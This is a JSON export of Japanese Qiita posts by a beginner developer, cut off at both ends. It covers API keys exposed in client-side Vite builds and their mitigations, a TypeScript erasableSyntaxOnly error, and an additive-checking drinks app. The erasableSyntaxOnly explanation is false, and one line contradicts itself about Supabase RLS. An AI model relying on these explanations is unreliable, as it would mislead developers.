.envはコード管理をしやすくするために定義するもの\n`.env`はファイル内に**URLやAPIキーなどを定義することで一元管理できます。**\nまた、`.gitignore`で.envを定義すれば、コミットされることはなく**GitHubなどに公開することを阻止できます。**\n\n**.envに定義、環境変数としてtsx上で使用してもコンパイル時には実際の値が定義される**ため、ブラウザ上では確認できます。\n**.envファイルなら環境変数で使用するから安全**と最初は思っていましたが、実際は違いました。\n\n# ビルドしたものでも同じ？\nえ？私プロダクトをビルドしてデプロイしたもの沢山あるけど、それもキーばれている?と思い、確認しました。\n\nhttps://stackblitz.com/edit/vitejs-vite-nwfvpeqa?file=.env,src%2FApp.tsx,src%2Fdomain%2Fmovie.ts,tsconfig.node.json,tsconfig.app.json\n\n先ほど作成したプロジェクトを`npm run build`でビルド\nビルドをするとtsxファイルなどプロジェクト全体が一つのjsファイルにまとめられ、`dist`配下に配置、一つにまとめられたjsがブラウザで実行され、HTMLが作られます。\n\nそのため、jsとcss、ひな形のHTMLのみがブラウザで確認できます。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/9d6d63b8-e848-416f-bdee-be4b7ac9b097.png)\n\n\n`npx serve dist`コマンドを実行し、ビルドしたものをブラウザ上で確認してみました。\n\nSourcesにて、ビルドで作られた`index-B0le57MV.js`ファイルからAPIキーを簡単に見つけられました。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/3472a209-5a32-41d9-b8e8-faa28f830422.png)\n\n\nNetworkでも`index-B0le57MV.js`ファイルから確認できました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1a95147b-7533-49a8-8fc6-66f5a1b59a30.png)\n\n**ビルドをすれば安全**と考えましたが、違いました。\n\nこれらのことから、**CSRの場合はブラウザでばれてしまう恐れがある**ということがわかりました。\n\n# じゃあどうしたらいいの\n### SSRでレンダリングする\n\nCSRの場合、jsファイルをブラウザ上で実行し、HTMLを作成します。\n\nSSRの場合、**tsxや定義しているAPIキーはサーバー上で使用、HTMLを作成します。**\nブラウザはサーバーから取得したHTMLを表示するのみのため、APIキーが見られることはありません。\n\n### CSRを使用しても問題ない仕組みを利用する\n#### Supabaseの場合\nこれまでの勉強でSupabaseを使用する機会が多くありました。\n\nhttps://supabase.com/docs/reference/javascript/initializing\n\nSupabaseのライブラリを使用する場合、APIキーを取得、指定する必要がありました。\nこれまで、`.env`を作り管理していましたが、CSRでレンダリングすると、簡単にURLとシークレットキーはブラウザ上で調べられます。\n\nしかし、Supabaseでは、アクセスするテーブルの`Row Level Security (RLS)の設定`を`ENABLE`にすることで対策が可能です。テーブルの更新や削除を阻止することができます。\n\n![Pasted image 20250703085248.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/045a457d-0f2a-4b5b-a634-899c84432dc2.png)\n\n今まで、RLSをdisabledにすることを何となく行い、CSRでテーブルへアクセスできるようにしていました。\n今回、なぜdisabledにしないといけないのかがわかりました。\n\n# おわりに\n今回、この事象について調べてみようと思ったのは、Remix＋React-router-v7のハンズオンに取り組んだことがきっかけでした。\n\nRemix＋React-router-v7の場合、clientLoader→CSR、loader→SSR、SSGにしたいファイル名を定義ファイルに記載する→SSG\nで簡単にレンダリング方法を変えることができます。\n\n最初は少し難しいなと感じたものの、メリットがわかるととても便利！と思いました。\nloaderに変えるだけで、APIキーをtsxファイルに直接書いてもブラウザで確認できなくなります。（個人的にはすごい！となりました。）\nぜひ、試してみてもらいたいです。\n\n# 参考\nhttps://qiita.com/Sicut_study/items/7dc1b0cdcc1bee210f05\n\nhttps://zenn.dev/rh820/articles/6234843d726ed3\n\nhttps://reactrouter.com/start/framework/data-loading\n","coediting":false,"comments_count":4,"created_at":"2025-07-05T10:49:43+09:00","group":null,"id":"6f1e71db852fd90ab912","likes_count":218,"private":false,"reactions_count":0,"stocks_count":200,"tags":[{"name":"API","versions":[]},{"name":"初心者","versions":[]},{"name":"React","versions":[]},{"name":"CSR","versions":[]},{"name":"vite","versions":[]}],"title":"【CSR】なぜCSRだとAPIキーがバレちゃうの？どうしたらいいの？","updated_at":"2025-08-24T11:24:37+09:00","url":"https://qiita.com/asa129/items/6f1e71db852fd90ab912","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":142425,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:99\">サンプルコードを実行しようとしたところ表題のエラーが発生しました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:113\">TypeScript + Viteプロジェクトで<code>npm run build</code>をしようとすると、表題のエラーが発生する</p>\n<p data-sourcepos=\"7:1-7:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fee11c0be-77bd-4ed7-9e8c-d0e9028b4367.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=caed93628e2d36a29e974ad173437a28\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fee11c0be-77bd-4ed7-9e8c-d0e9028b4367.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=caed93628e2d36a29e974ad173437a28\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fee11c0be-77bd-4ed7-9e8c-d0e9028b4367.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=d111a5a6263473198f01ac46d9d6f1d3 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ee11c0be-77bd-4ed7-9e8c-d0e9028b4367.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"9:1-9:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"10:1-10:91\"><code>tsconfig.app.json</code>に定義されている<code>erasableSyntaxOnly</code>がTrueになっていた。</p>\n<p data-sourcepos=\"12:1-13:181\"><code>erasableSyntaxOnly:true</code>の場合、TypeScriptからコンパイルする時に、型チェックやアクセス修飾子のチェックを行わず、構文チェックのみ行うそうです。<br>\nコンパイル対象のファイル内に、アクセス修飾子を指定していたかつ、<code>erasableSyntaxOnly:true</code>のため、チェックエラーとなっていました。</p>\n<h1 data-sourcepos=\"15:1-15:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"16:1-16:37\"><code>erasableSyntaxOnly</code>をfalseにする</p>\n<div class=\"code-frame\" data-lang=\"json\" data-sourcepos=\"18:1-24:3\"><div class=\"highlight\"><pre><code><span class=\"p\">{</span><span class=\"w\">\n  </span><span class=\"nl\">\"compilerOptions\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"nl\">\"erasableSyntaxOnly\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">false</span><span class=\"w\">\n  </span><span class=\"p\">}</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre></div></div>\n<h1 data-sourcepos=\"26:1-26:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"27:1-28:107\"><code>erasableSyntaxOnly</code>はTypeScript v5.8で追加されたオプションだそうです。<br>\n検索しても解決方法が見つからず、AIに聞くとわかりやすく教えてくれました。</p>\n<h1 data-sourcepos=\"30:1-30:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"32:1-32:62\"><iframe id=\"qiita-embed-content__69e165d34e6dcce945130ada0d9fd55a\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__69e165d34e6dcce945130ada0d9fd55a\" data-content=\"https%3A%2F%2Fwww.typescriptlang.org%2Fja%2Ftsconfig%2F%23erasableSyntaxOnly\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nサンプルコードを実行しようとしたところ表題のエラーが発生しました。\n\n# 問題\nTypeScript + Viteプロジェクトで`npm run build`をしようとすると、表題のエラーが発生する\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ee11c0be-77bd-4ed7-9e8c-d0e9028b4367.png)\n\n# 原因\n`tsconfig.app.json`に定義されている`erasableSyntaxOnly`がTrueになっていた。\n\n`erasableSyntaxOnly:true`の場合、TypeScriptからコンパイルする時に、型チェックやアクセス修飾子のチェックを行わず、構文チェックのみ行うそうです。\nコンパイル対象のファイル内に、アクセス修飾子を指定していたかつ、`erasableSyntaxOnly:true`のため、チェックエラーとなっていました。\n\n# 解決方法\n`erasableSyntaxOnly`をfalseにする\n\n```json\n{\n  \"compilerOptions\": {\n      \"erasableSyntaxOnly\": false\n  }\n}\n```\n\n# おわりに\n`erasableSyntaxOnly`はTypeScript v5.8で追加されたオプションだそうです。\n検索しても解決方法が見つからず、AIに聞くとわかりやすく教えてくれました。\n\n# 参考\n\nhttps://www.typescriptlang.org/ja/tsconfig/#erasableSyntaxOnly\n","coediting":false,"comments_count":0,"created_at":"2025-07-04T20:35:03+09:00","group":null,"id":"1117a2ee0a863b03090f","likes_count":2,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"error","versions":[]},{"name":"TypeScript","versions":[]}],"title":"【TypeScript】error TS1294: This syntax is not allowed when 'erasableSyntaxOnly' is enabled.","updated_at":"2025-07-04T20:35:03+09:00","url":"https://qiita.com/asa129/items/1117a2ee0a863b03090f","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":868,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:143\">初めて、個人開発に挑戦しました！「アイデア出し⇒MVP作成⇒プロダクト作成」を自力で行い、作りたいものを作るということに挑戦、やり遂げることができました。<br>\nこの記事では、作成過程や開発初心者が0→1で作れるようになるまでに得た気づきを書きたいと思います。</p>\n<h1 data-sourcepos=\"5:1-5:26\">\n<span id=\"作ったものの紹介\" class=\"fragment\"></span><a href=\"#%E4%BD%9C%E3%81%A3%E3%81%9F%E3%82%82%E3%81%AE%E3%81%AE%E7%B4%B9%E4%BB%8B\"><i class=\"fa fa-link\"></i></a>作ったものの紹介</h1>\n<h2 data-sourcepos=\"6:1-6:67\">\n<span id=\"添加物が気になる人のためのお酒検索アプリ\" class=\"fragment\"></span><a href=\"#%E6%B7%BB%E5%8A%A0%E7%89%A9%E3%81%8C%E6%B0%97%E3%81%AB%E3%81%AA%E3%82%8B%E4%BA%BA%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AE%E3%81%8A%E9%85%92%E6%A4%9C%E7%B4%A2%E3%82%A2%E3%83%97%E3%83%AA\"><i class=\"fa fa-link\"></i></a>添加物が気になる人のためのお酒検索アプリ🍶</h2>\n<div>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb5721a90-55a9-433b-a2ab-c3a1db6f1b6d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=78c8d446eca0c905ae914e31bb33fe93\" target=\"_blank\" rel=\"nofollow noopener\"><img width=\"400\" src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb5721a90-55a9-433b-a2ab-c3a1db6f1b6d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=78c8d446eca0c905ae914e31bb33fe93\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb5721a90-55a9-433b-a2ab-c3a1db6f1b6d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5352a36119e4e53485949f49156b9a7e 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b5721a90-55a9-433b-a2ab-c3a1db6f1b6d.png\" loading=\"lazy\"></a>\n</div>\n<h3 data-sourcepos=\"12:1-12:25\">\n<span id=\"なぜ作ったのか\" class=\"fragment\"></span><a href=\"#%E3%81%AA%E3%81%9C%E4%BD%9C%E3%81%A3%E3%81%9F%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>なぜ作ったのか</h3>\n<p data-sourcepos=\"14:1-14:105\">ニッチです。添加物って何？と思う方もいらっしゃるのではないでしょうか。</p>\n<p data-sourcepos=\"16:1-18:216\"><strong>商品を手に取らないと添加物がわからない</strong><br>\n私は、お酒が大好きです。<br>\nその一方で、食品や飲み物を買うときに添加物が入りすぎていないか気になってしまいます。スーパーで缶チューハイを手にとっては成分表を眺めていました。</p>\n<p data-sourcepos=\"20:1-21:469\"><strong>添加物が入っていないものを調べるのに手間がかかる</strong><br>\n趣味で加入しているトレーニングサロンの集まりで、意外と添加物を気にしている人は多い印象がありました。<code>食品を手に取った際は成分表を見てしまう、ないものを探すのが大変</code>との意見もありました。公式サイトなどで調べることもできますが、調べるにも<code>検索→商品情報や成分表のページを探す→入っているか確認する</code>手間がかかります。</p>\n<p data-sourcepos=\"23:1-23:207\">健康に気を使っている人や、特定の原材料を避けたい人も一定数いることはわかっていましたが、現状簡単に調べられるものが少ないと感じていました。</p>\n<p data-sourcepos=\"25:1-26:243\"><strong>毎回同じものを選んでしまう</strong><br>\nシンプルなもので作られているドリンク（ウォッカと果汁のみなど）を買いたいなと思いつつもあまりなく、見つけることが難しいです。そのため同じドリンクを選びがちでした。</p>\n<h3 data-sourcepos=\"28:1-28:52\">\n<span id=\"なぜ添加物を気にする人がいるのか\" class=\"fragment\"></span><a href=\"#%E3%81%AA%E3%81%9C%E6%B7%BB%E5%8A%A0%E7%89%A9%E3%82%92%E6%B0%97%E3%81%AB%E3%81%99%E3%82%8B%E4%BA%BA%E3%81%8C%E3%81%84%E3%82%8B%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>なぜ添加物を気にする人がいるのか</h3>\n<p data-sourcepos=\"29:1-30:144\">私は人工甘味料が入った飲み物やお菓子を摂取しすぎると、お腹がゆるく感じることがありました。<br>\nなるべく人工甘味料が入っていない飲み物を選びたいと思ったことが、添加物を気にするきっかけでした。</p>\n<p data-sourcepos=\"32:1-32:90\">トレーニングサロンのメンバーからは、様々な意見を聞きました。</p>\n<ul data-sourcepos=\"33:1-37:0\">\n<li data-sourcepos=\"33:1-33:104\">小さいころからアレルギーやアトピーで悩んでいて、特定のものを避けたい</li>\n<li data-sourcepos=\"34:1-34:65\">子どもの体調を気にかけて、避ける傾向にある</li>\n<li data-sourcepos=\"35:1-35:74\">発がん性があったり、負担があったりと何となく不安</li>\n<li data-sourcepos=\"36:1-37:0\">なるべく自然由来の物を摂りたい</li>\n</ul>\n<p data-sourcepos=\"38:1-39:84\">科学的な意見は様々あり、食品の安全性を保つためにも添加物は必要とはわかっているものの、気にする人が一定数いることも事実です。<br>\nそういった方々が安心して選べるようにしたいと思いました。</p>\n<h3 data-sourcepos=\"42:1-42:58\">\n<span id=\"このアプリでどのように解決できるのか\" class=\"fragment\"></span><a href=\"#%E3%81%93%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AA%E3%81%A7%E3%81%A9%E3%81%AE%E3%82%88%E3%81%86%E3%81%AB%E8%A7%A3%E6%B1%BA%E3%81%A7%E3%81%8D%E3%82%8B%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>このアプリでどのように解決できるのか</h3>\n<p data-sourcepos=\"44:1-44:262\">上記の問題を解決するために、<b>「簡単に添加物有無がわかる」「添加物がない・少ないお酒を簡単に調べられる」「自分の希望にあう新しいお酒に出会える」</b>ことを目指して作成しました。</p>\n<p data-sourcepos=\"46:1-47:171\"><strong>「商品を手に取らないと添加物がわからない」</strong><br>\n商品カードに添加物有無のアイコンと添加物情報欄を設け、簡単に「添加物有無」と「添加物情報」がわかるようにしました。</p>\n<p data-sourcepos=\"49:1-49:75\">→毎回お酒を手にとって確認する必要がなくなります。</p>\n<div>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb3aa3e7e-b6f1-4016-a1ce-0a34a8d463d0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e42d7e767f0f63e8a2bc066f8eca565d\" target=\"_blank\" rel=\"nofollow noopener\"><img width=\"200\" src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb3aa3e7e-b6f1-4016-a1ce-0a34a8d463d0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e42d7e767f0f63e8a2bc066f8eca565d\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb3aa3e7e-b6f1-4016-a1ce-0a34a8d463d0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=d3bd17fcdcf5bf578e6a0a59fe5b01a3 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b3aa3e7e-b6f1-4016-a1ce-0a34a8d463d0.png\" loading=\"lazy\"></a>\n</div>\n<p data-sourcepos=\"55:1-57:205\"><strong>「添加物が入っていないものを調べるのに手間がかかる」</strong><br>\n検索項目が多いと簡単に調べられない/手間が増えると考えていました。<br>\nメインの検索フォームには商品名と添加物有無のフィルター項目のみ設け、「添加物あり/なし」、「気になる商品に添加物があるか」に特化しました。</p>\n<p data-sourcepos=\"59:1-59:72\">→添加物がない・少ないお酒を簡単に調べられます。</p>\n<div>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F3701fb25-81ae-47bc-9efd-76a89f817420.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=85f1672a5440d3bf90007402a2a391d7\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F3701fb25-81ae-47bc-9efd-76a89f817420.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=85f1672a5440d3bf90007402a2a391d7\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F3701fb25-81ae-47bc-9efd-76a89f817420.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6f81cba6a2d7ac2c5fa454a2443d4979 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/3701fb25-81ae-47bc-9efd-76a89f817420.png\" loading=\"lazy\"></a>\n</div>\n<p data-sourcepos=\"66:1-67:120\"><strong>「毎回同じものを選んでしまう」</strong><br>\n様々な飲料メーカーのサイトから情報を収集し、豊富なデータを揃えるようにしました。</p>\n<p data-sourcepos=\"69:1-69:135\">→いつも同じものを選んでしまうことを解決、新しいお酒を見つけることができるようにしました。</p>\n<h2 data-sourcepos=\"71:1-71:15\">\n<span id=\"機能概要\" class=\"fragment\"></span><a href=\"#%E6%A9%9F%E8%83%BD%E6%A6%82%E8%A6%81\"><i class=\"fa fa-link\"></i></a>機能概要</h2>\n<h3 data-sourcepos=\"72:1-72:28\">\n<span id=\"1-添加物チェック\" class=\"fragment\"></span><a href=\"#1-%E6%B7%BB%E5%8A%A0%E7%89%A9%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF\"><i class=\"fa fa-link\"></i></a>1. 添加物チェック</h3>\n<p data-sourcepos=\"73:1-74:120\">各カードに添加物有無のアイコンをつけて一目でわかる、<br>\nカード内では添加物情報を設け、気になるものが入っていないかわかるようにしました。</p>\n<h3 data-sourcepos=\"76:1-76:19\">\n<span id=\"2-検索機能\" class=\"fragment\"></span><a href=\"#2-%E6%A4%9C%E7%B4%A2%E6%A9%9F%E8%83%BD\"><i class=\"fa fa-link\"></i></a>2. 検索機能</h3>\n<p data-sourcepos=\"77:1-78:101\"><strong>商品名・添加物有無で検索：</strong> お酒の商品名、添加物有無で気軽に検索<br>\n<strong>詳細検索：</strong> 特定の添加物や添加物名称、主要な飲料メーカーで絞りこみ</p>\n<p data-sourcepos=\"80:1-80:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F74e431cf-a27e-46df-b917-d5e5852edb6d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=39ac6cbbf2b54d834724f4e0bdb3a898\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F74e431cf-a27e-46df-b917-d5e5852edb6d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=39ac6cbbf2b54d834724f4e0bdb3a898\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F74e431cf-a27e-46df-b917-d5e5852edb6d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=f1958db47aa821e4778ccb602b2cb69c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/74e431cf-a27e-46df-b917-d5e5852edb6d.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"83:1-83:25\">\n<span id=\"3-お酒情報詳細\" class=\"fragment\"></span><a href=\"#3-%E3%81%8A%E9%85%92%E6%83%85%E5%A0%B1%E8%A9%B3%E7%B4%B0\"><i class=\"fa fa-link\"></i></a>3. お酒情報詳細</h3>\n<p data-sourcepos=\"84:1-85:138\">添加物以外にも、健康志向の人に向けた情報を追加しました。<br>\nアルコール度数、糖質量、カロリー、おすすめレシピやペアリングなども紹介できるようにしました。</p>\n<div>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F814e3145-8a15-4456-85dc-d354d50b7884.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=03b46e261c45dde95f0324ac48011cab\" target=\"_blank\" rel=\"nofollow noopener\"><img width=\"300\" src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F814e3145-8a15-4456-85dc-d354d50b7884.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=03b46e261c45dde95f0324ac48011cab\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F814e3145-8a15-4456-85dc-d354d50b7884.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=407f309505171a22c09cf55f10c9e27e 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/814e3145-8a15-4456-85dc-d354d50b7884.png\" loading=\"lazy\"></a>\n</div>\n<h3 data-sourcepos=\"91:1-91:37\">\n<span id=\"4-自動データ登録バッチ\" class=\"fragment\"></span><a href=\"#4-%E8%87%AA%E5%8B%95%E3%83%87%E3%83%BC%E3%82%BF%E7%99%BB%E9%8C%B2%E3%83%90%E3%83%83%E3%83%81\"><i class=\"fa fa-link\"></i></a>4. 自動データ登録バッチ</h3>\n<p data-sourcepos=\"92:1-92:201\">定期的に新しい情報や商品情報を収集、登録できればと思い、バッチコマンド実行で、メーカーサイトから情報を収集、登録できるようにしました。</p>\n<h2 data-sourcepos=\"95:1-95:21\">\n<span id=\"技術スタック\" class=\"fragment\"></span><a href=\"#%E6%8A%80%E8%A1%93%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF\"><i class=\"fa fa-link\"></i></a>技術スタック</h2>\n<table data-sourcepos=\"96:1-103:33\">\n<thead>\n<tr data-sourcepos=\"96:1-96:25\">\n<th style=\"text-align: center\" data-sourcepos=\"96:2-96:15\">カテゴリ</th>\n<th style=\"text-align: center\" data-sourcepos=\"96:17-96:24\">技術</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"98:1-98:66\">\n<td style=\"text-align: center\" data-sourcepos=\"98:2-98:25\">フロントエンド</td>\n<td style=\"text-align: center\" data-sourcepos=\"98:27-98:65\">TypeScript, React, Tailwind CSS, Vite</td>\n</tr>\n<tr data-sourcepos=\"99:1-99:50\">\n<td style=\"text-align: center\" data-sourcepos=\"99:2-99:25\">バックエンド/DB</td>\n<td style=\"text-align: center\" data-sourcepos=\"99:27-99:49\">Supabase, TypeScript</td>\n</tr>\n<tr data-sourcepos=\"100:1-100:28\">\n<td style=\"text-align: center\" data-sourcepos=\"100:2-100:15\">デプロイ</td>\n<td style=\"text-align: center\" data-sourcepos=\"100:17-100:27\">Firebase</td>\n</tr>\n<tr data-sourcepos=\"101:1-101:44\">\n<td style=\"text-align: center\" data-sourcepos=\"101:2-101:13\">テスト</td>\n<td style=\"text-align: center\" data-sourcepos=\"101:15-101:43\">Jest, React Testing Library</td>\n</tr>\n<tr data-sourcepos=\"102:1-102:26\">\n<td style=\"text-align: center\" data-sourcepos=\"102:2-102:7\">CICD</td>\n<td style=\"text-align: center\" data-sourcepos=\"102:9-102:25\">GitHub Actions</td>\n</tr>\n<tr data-sourcepos=\"103:1-103:33\">\n<td style=\"text-align: center\" data-sourcepos=\"103:2-103:7\">他</td>\n<td style=\"text-align: center\" data-sourcepos=\"103:9-103:32\">Claude API, puppeteer</td>\n</tr>\n</tbody>\n</table>\n<h3 data-sourcepos=\"105:1-105:22\">\n<span id=\"テーブル構成\" class=\"fragment\"></span><a href=\"#%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E6%A7%8B%E6%88%90\"><i class=\"fa fa-link\"></i></a>テーブル構成</h3>\n<div>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fca065560-b864-49f3-841c-be94c2d1d011.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=98cf2dcc1216f09dd163e18bd3646ee6\" target=\"_blank\" rel=\"nofollow noopener\"><img width=\"600\" src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fca065560-b864-49f3-841c-be94c2d1d011.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=98cf2dcc1216f09dd163e18bd3646ee6\" 